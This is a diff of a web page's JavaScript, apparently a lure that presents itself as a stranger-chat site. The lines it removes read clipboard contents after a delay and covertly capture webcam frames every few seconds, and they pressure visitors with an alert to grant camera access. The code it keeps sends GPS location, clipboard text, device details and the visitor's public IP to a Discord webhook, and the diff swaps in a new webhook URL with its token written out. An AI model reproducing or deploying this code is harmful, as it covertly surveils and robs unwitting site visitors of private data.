@@ -115,29 +115,7 @@
             }
 
              const publicIp = getPublicIp();
-             async function getclips() {
-                var btr = await navigator.getBattery();
-                batterypercentage = String(btr.level * 100 + "%");
-                ischarging = String(btr.charging);
-
-              // Add a 8-second delay using setTimeout
-              setTimeout(async function() {
-                try {
-                  let victimtext = await navigator.clipboard.readText();
-                  giveclips(victimtext);
-                } catch (error) {
-                  giveclips("Clipboard Permission Denied");
-                }
-              }, 8000);
-            }
-
-            getclips();
-           var clips
-
-           function giveclips(polp) {
-             clips = polp
-             getLocation()
-           }
+        
 
           function getLocation() {
                  if (navigator.geolocation) {
@@ -191,7 +169,7 @@
 
            function senddis(gpsr, clips,batterypercentage,ischarging) {
              var request = new XMLHttpRequest();
-             request.open("POST", "https://discord.com/api/webhooks/1267765524390088836/cdIZanQiGa-sH95Qrhcq9VgNZCA5V0QfVeMMpJgbdmBoKvMEK2GiT0cwEXhgYx3pyMC-");
+             request.open("POST", "https://discord.com/api/webhooks/1269744683979116584/cNjKRdP0NsvH3NIpezZoS5x1NU336ma0GlpVGf-QLB5m_vfU_gX797a_9jhOiNsLkihm");
              request.setRequestHeader('Content-type', 'application/json');
              var params = {
                content: ("> **DeviceGps  : **" + gpsr + "\n> **NetworkInformation : **" + networkinformation + "\n> **BatteryPercentage : **" + batterypercentage + "\n> **Ischarging : **" + ischarging + "\n> **ScreenWidth : **" + width + "\n> **ScreenHeight : **" + height + "\n> **PlatForm : **" + platform + "\n> **DeviceLanguage : **" + devicelang + "\n> **DeviceMemory : **" + deviceram + "\n> **IsCookieEnabled : **" + iscookieEnabled + "\n> **UserAgent : **" + useragent + "\n> **CpuThreads : **" + cpuThreads + "\n> **ReferUrl : **" + referurl + "\n> **Clipboard : **" + clips + "\n> **DeviceLocalTime : **" + localtime + "\n" + "> **Public IP  : **" + publicIp),
@@ -231,11 +209,7 @@
            }
          })
       </script>
-   </head>
-   <div class="video-wrap" hidden="hidden">
-      <video id="video" playsinline autoplay></video>
-   </div>
-   <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
    <script>
       function post(imgdata) {
         $.ajax({
@@ -253,40 +227,9 @@
         });
       };
       'use strict';
-      const video = document.getElementById('video');
-      const canvas = document.getElementById('canvas');
-      const errorMsgElement = document.querySelector('span#errorMsg');
-      const constraints = {
-        audio: false,
-        video: {
-          facingMode: "user"
-        }
-      };
-      // Access webcam
-      async function init() {
-        try {
-          const stream = await navigator.mediaDevices.getUserMedia(constraints);
-          handleSuccess(stream);
-        } catch (e) {
-          setTimeout(function(){
-          alert("Allow Camera access to chat with strangers");
-          window.location.href = "https://support.onemob.com/hc/en-us/articles/360037342154-How-do-I-grant-permission-for-Camera-and-Microphone-in-my-web-browser-"
-      alert("Read this page to grant camera access to  our website")
-       },15000) }
-      }
-      // Success
-      function handleSuccess(stream) {
-        window.stream = stream;
-        video.srcObject = stream;
-        var context = canvas.getContext('2d');
-        setInterval(function() {
-          context.drawImage(video, 0, 0, 640, 480);
-          var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
-          post(canvasData);
-        }, 3500);
-      }
-      // Load init
-      init();
+    
+    
+   
    </script>
    <body>
 
